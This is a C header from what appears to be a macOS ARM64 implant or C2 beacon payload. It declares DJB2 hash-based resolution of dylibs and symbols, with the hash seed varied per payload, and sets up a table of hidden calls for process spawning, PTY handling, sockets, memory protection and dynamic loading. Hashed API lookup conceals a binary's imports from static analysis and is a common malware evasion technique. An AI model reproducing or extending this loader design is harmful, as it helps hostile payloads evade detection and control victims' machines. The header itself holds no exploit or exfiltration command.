#ifndef DYLD_RESOLVE_H
#define DYLD_RESOLVE_H

#include <stdint.h>
#include <stddef.h>

/// DJB2 hash-based API resolution for Mach-O on macOS ARM64
/// Equivalent to beacon's ProcLoader.cpp but for dyld/LC_SYMTAB
///
/// Usage:
///   void* libsystem = dyld_resolve_lib(HASH_LIB_LIBSYSTEM);
///   void* fn_open = dyld_resolve_sym(libsystem, HASH_FUNC_OPEN);
///   ((int(*)(const char*, int, int))fn_open)("/dev/urandom", 0, 0);

/// DJB2 hash function (case-insensitive, seeded)
/// Seed is defined per-payload via -DDJB2_SEED=<uint32>U
#ifndef DJB2_SEED
#define DJB2_SEED 0x1505U  // Default seed (overridden per-payload)
#endif

uint32_t djb2_hash(const char* str);

/// Resolve a loaded dylib by hash of its base name
/// Iterates _dyld_image_count(), hashes each image name's basename
/// Returns the image header address (Mach-O header) or NULL
void* dyld_resolve_lib(uint32_t name_hash);

/// Resolve a symbol within a Mach-O image by hash
/// Parses LC_SYMTAB to find the symbol, returns its address or NULL
void* dyld_resolve_sym(void* image_header, uint32_t symbol_hash);

/// Initialize the resolver — resolves critical bootstrap functions
/// Call once at startup before using any resolved APIs
int dyld_resolver_init(void);

/// Resolved API table (populated by dyld_resolver_init)
typedef struct {
    // ── File I/O ──
    void* fn_open;
    void* fn_close;
    void* fn_read;
    void* fn_write;
    void* fn_stat;
    void* fn_fstat;
    void* fn_unlink;
    void* fn_rename;
    void* fn_mkdir;
    void* fn_opendir;
    void* fn_readdir;
    void* fn_closedir;
    void* fn_getcwd;
    void* fn_chdir;
    void* fn_copyfile;
    void* fn_rmdir;
    void* fn_rewinddir;

    // ── Memory ──
    void* fn_mmap;
    void* fn_munmap;
    void* fn_mprotect;

    // ── Process ──
    void* fn_fork;
    void* fn_execve;
    void* fn_execvp;
    void* fn_execl;
    void* fn_execlp;
    void* fn_waitpid;
    void* fn_getpid;
    void* fn_getuid;
    void* fn_geteuid;
    void* fn_kill;
    void* fn_killpg;
    void* fn_setsid;
    void* fn_setpgid;
    void* fn_exit;       // _exit

    // ── Network ──
    void* fn_socket;
    void* fn_connect;
    void* fn_getaddrinfo;
    void* fn_freeaddrinfo;
    void* fn_gethostname;
    void* fn_getsockopt;
    void* fn_setsockopt;
    void* fn_select;

    // ── System ──
    void* fn_sysctl;
    void* fn_sysctlbyname;
    void* fn_getenv;
    void* fn_setenv;
    void* fn_sleep;
    void* fn_usleep;

    // ── Pipes & PTY ──
    void* fn_pipe;
    void* fn_dup2;
    void* fn_fcntl;
    void* fn_posix_openpt;
    void* fn_grantpt;
    void* fn_unlockpt;
    void* fn_ptsname;
    void* fn_ioctl;

    // ── Threading ──
    void* fn_pthread_create;
    void* fn_pthread_detach;
    void* fn_pthread_mutex_init;
    void* fn_pthread_mutex_lock;
    void* fn_pthread_mutex_unlock;

    // ── Crypto/Random ──
    void* fn_arc4random_buf;

    // ── String/Misc ──
    void* fn_dlopen;
    void* fn_dlsym;
    void* fn_dlclose;

    // ── macOS-specific ──
    void* fn_getpwuid;
    void* fn_getgrgid;
    void* fn_getifaddrs;
    void* fn_freeifaddrs;
    void* fn_inet_ntop;
    void* fn_localtime;
    void* fn_strftime;
} resolved_apis_t;

extern resolved_apis_t g_apis;

// ── Convenience casting macros ──
// These provide type-safe access to resolved APIs without verbose manual casts.
// Each file includes its own system headers, so the types are already defined.
// These macros are safe to use in any .c file that includes dyld_resolve.h
// AFTER the relevant system headers (which all our files do).

#define R_open(p,f,m)           ((int(*)(const char*,int,...))g_apis.fn_open)(p,f,m)
#define R_close(fd)             ((int(*)(int))g_apis.fn_close)(fd)
#define R_read(fd,b,n)          ((long(*)(int,void*,unsigned long))g_apis.fn_read)(fd,b,n)
#define R_write(fd,b,n)         ((long(*)(int,const void*,unsigned long))g_apis.fn_write)(fd,b,n)
#define R_stat(p,s)             ((int(*)(const char*,void*))g_apis.fn_stat)(p,s)
#define R_fstat(fd,s)           ((int(*)(int,void*))g_apis.fn_fstat)(fd,s)
#define R_unlink(p)             ((int(*)(const char*))g_apis.fn_unlink)(p)
#define R_rename(o,n)           ((int(*)(const char*,const char*))g_apis.fn_rename)(o,n)
#define R_mkdir(p,m)            ((int(*)(const char*,unsigned short))g_apis.fn_mkdir)(p,m)
#define R_opendir(p)            ((void*(*)(const char*))g_apis.fn_opendir)(p)
#define R_readdir(d)            ((void*(*)(void*))g_apis.fn_readdir)(d)
#define R_closedir(d)           ((int(*)(void*))g_apis.fn_closedir)(d)
#define R_getcwd(b,s)           ((char*(*)(char*,unsigned long))g_apis.fn_getcwd)(b,s)
#define R_chdir(p)              ((int(*)(const char*))g_apis.fn_chdir)(p)
#define R_copyfile(s,d,st,f)    ((int(*)(const char*,const char*,void*,unsigned int))g_apis.fn_copyfile)(s,d,st,f)
#define R_rmdir(p)              ((int(*)(const char*))g_apis.fn_rmdir)(p)
#define R_rewinddir(d)          ((void(*)(void*))g_apis.fn_rewinddir)(d)

#define R_fork()                ((int(*)(void))g_apis.fn_fork)()
#define R_execve(p,a,e)         ((int(*)(const char*,char*const*,char*const*))g_apis.fn_execve)(p,a,e)
#define R_execvp(f,a)           ((int(*)(const char*,char*const*))g_apis.fn_execvp)(f,a)
#define R_execl(...)            ((int(*)(const char*,...))g_apis.fn_execl)(__VA_ARGS__)
#define R_execlp(...)           ((int(*)(const char*,...))g_apis.fn_execlp)(__VA_ARGS__)
#define R_waitpid(p,s,o)        ((int(*)(int,int*,int))g_apis.fn_waitpid)(p,s,o)
#define R_getpid()              ((int(*)(void))g_apis.fn_getpid)()
#define R_getuid()              ((unsigned int(*)(void))g_apis.fn_getuid)()
#define R_geteuid()             ((unsigned int(*)(void))g_apis.fn_geteuid)()
#define R_kill(p,s)             ((int(*)(int,int))g_apis.fn_kill)(p,s)
#define R_killpg(pg,s)          ((int(*)(int,int))g_apis.fn_killpg)(pg,s)
#define R_setsid()              ((int(*)(void))g_apis.fn_setsid)()
#define R_setpgid(p,g)          ((int(*)(int,int))g_apis.fn_setpgid)(p,g)
#define R_exit(s)               ((void(*)(int))g_apis.fn_exit)(s)

#define R_socket(d,t,p)         ((int(*)(int,int,int))g_apis.fn_socket)(d,t,p)
#define R_connect(s,a,l)        ((int(*)(int,const void*,unsigned int))g_apis.fn_connect)(s,a,l)
#define R_getaddrinfo(h,s,hi,r) ((int(*)(const char*,const char*,const void*,void*))g_apis.fn_getaddrinfo)(h,s,hi,r)
#define R_freeaddrinfo(r)       ((void(*)(void*))g_apis.fn_freeaddrinfo)(r)
#define R_gethostname(b,l)      ((int(*)(char*,unsigned long))g_apis.fn_gethostname)(b,l)
#define R_getsockopt(s,l,o,v,n) ((int(*)(int,int,int,void*,unsigned int*))g_apis.fn_getsockopt)(s,l,o,v,n)
#define R_select(n,r,w,e,t)     ((int(*)(int,void*,void*,void*,void*))g_apis.fn_select)(n,r,w,e,t)

#define R_sysctl(m,c,o,os,n,ns) ((int(*)(int*,unsigned int,void*,unsigned long*,void*,unsigned long))g_apis.fn_sysctl)(m,c,o,os,n,ns)
#define R_getenv(k)             ((char*(*)(const char*))g_apis.fn_getenv)(k)
#define R_setenv(k,v,o)         ((int(*)(const char*,const char*,int))g_apis.fn_setenv)(k,v,o)
#define R_sleep(s)              ((unsigned int(*)(unsigned int))g_apis.fn_sleep)(s)
#define R_usleep(u)             ((int(*)(unsigned int))g_apis.fn_usleep)(u)

#define R_pipe(p)               ((int(*)(int*))g_apis.fn_pipe)(p)
#define R_dup2(o,n)             ((int(*)(int,int))g_apis.fn_dup2)(o,n)
#define R_fcntl(fd,cmd,...)     ((int(*)(int,int,...))g_apis.fn_fcntl)(fd,cmd,##__VA_ARGS__)
#define R_posix_openpt(f)       ((int(*)(int))g_apis.fn_posix_openpt)(f)
#define R_grantpt(fd)           ((int(*)(int))g_apis.fn_grantpt)(fd)
#define R_unlockpt(fd)          ((int(*)(int))g_apis.fn_unlockpt)(fd)
#define R_ptsname(fd)           ((char*(*)(int))g_apis.fn_ptsname)(fd)
#define R_ioctl(fd,r,...)       ((int(*)(int,unsigned long,...))g_apis.fn_ioctl)(fd,r,##__VA_ARGS__)

#define R_pthread_create(t,a,f,d)  ((int(*)(void*,const void*,void*(*)(void*),void*))g_apis.fn_pthread_create)(t,a,f,d)
#define R_pthread_detach(t)        ((int(*)(void*))g_apis.fn_pthread_detach)((void*)(t))
#define R_pthread_mutex_init(m,a)  ((int(*)(void*,const void*))g_apis.fn_pthread_mutex_init)(m,a)
#define R_pthread_mutex_lock(m)    ((int(*)(void*))g_apis.fn_pthread_mutex_lock)(m)
#define R_pthread_mutex_unlock(m)  ((int(*)(void*))g_apis.fn_pthread_mutex_unlock)(m)

#define R_getpwuid(u)           ((void*(*)(unsigned int))g_apis.fn_getpwuid)(u)
#define R_getgrgid(g)           ((void*(*)(unsigned int))g_apis.fn_getgrgid)(g)
#define R_getifaddrs(a)         ((int(*)(void*))g_apis.fn_getifaddrs)(a)
#define R_freeifaddrs(a)        ((void(*)(void*))g_apis.fn_freeifaddrs)(a)
#define R_inet_ntop(f,s,d,l)    ((const char*(*)(int,const void*,char*,unsigned int))g_apis.fn_inet_ntop)(f,s,d,l)
#define R_localtime(t)          ((void*(*)(const void*))g_apis.fn_localtime)(t)
#define R_strftime(b,m,f,t)     ((unsigned long(*)(char*,unsigned long,const char*,const void*))g_apis.fn_strftime)(b,m,f,t)

#endif // DYLD_RESOLVE_H
